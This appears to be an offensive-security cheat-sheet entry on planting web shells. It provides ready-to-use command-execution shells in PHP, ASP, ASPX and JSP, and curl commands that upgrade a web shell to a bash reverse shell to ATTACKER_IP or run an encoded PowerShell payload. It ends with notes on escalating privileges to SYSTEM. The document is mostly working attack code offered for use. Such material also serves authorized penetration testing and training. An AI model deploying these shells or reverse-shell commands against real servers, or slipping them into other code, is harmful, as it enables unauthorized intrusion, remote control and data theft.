---
id: web-shell
title: Web Shell
stage: foothold
tags: [windows, linux, web]
summary: Plant a minimal script on the server to execute OS commands via HTTP — a stepping stone to a full reverse shell, not a final destination.
leads_to:
  - linux-suid-caps
  - linux-sudo
  - token-impersonation
  - rev-shell
  - linux-cred-hunting
  - linux-cron
---

## Prerequisites

File execution path is web-accessible (uploaded file, write to web root via SQLi or path traversal). For PHP: `system()` / `passthru()` / `shell_exec()` not disabled in php.ini. For JSP: Tomcat or servlet container running.

A web shell converts file write access into command execution — you interact with it via HTTP GET parameters. It's semi-interactive and fragile (no stdin, no job control), so upgrade to a reverse shell as quickly as possible. Watch for WAFs blocking keywords like `system` or `exec` — `passthru` is a useful alternative.

## Quick Win

> PHP one-liner — access it at `/uploads/shell.php?cmd=id` to confirm execution.

```php
<?php system($_GET['cmd']); ?>
```

## Minimal Shell Payloads

> One shell per language — pick the one matching the server stack.

```php
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo "<pre>".shell_exec($_GET['cmd'])."</pre>"; ?>
```

```asp
<%eval request("cmd")%>
```

```aspx
<%@ Page Language="C#" %><%System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>
```

```jsp
<%@ page import="java.io.*,java.util.*" %>
<% String cmd = request.getParameter("cmd");
   Process p = Runtime.getRuntime().exec(new String[]{"sh","-c",cmd});
   out.println(new Scanner(p.getInputStream()).useDelimiter("\\A").next()); %>
```

## Upgrade to Reverse Shell

> Trigger a reverse shell from the web shell — URL-encode special characters for GET requests.

```bash
# Linux — URL-encoded bash reverse shell
curl "http://$TARGET/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/PORT+0>%261'"

# Windows — send base64-encoded PowerShell payload
# Encode locally: echo -n 'PS_PAYLOAD' | iconv -t UTF-16LE | base64 -w 0
curl "http://$TARGET/shell.aspx?cmd=powershell+-enc+BASE64_PAYLOAD"
```

## Leads To

Web shell confirmed → immediately run the upgrade to rev-shell for a stable session. On Linux, `cmd=id` → `www-data` → check sudo and SUID from the shell. On Windows IIS/ASPX → `cmd=whoami+/priv` → SeImpersonatePrivilege → GodPotato for SYSTEM.
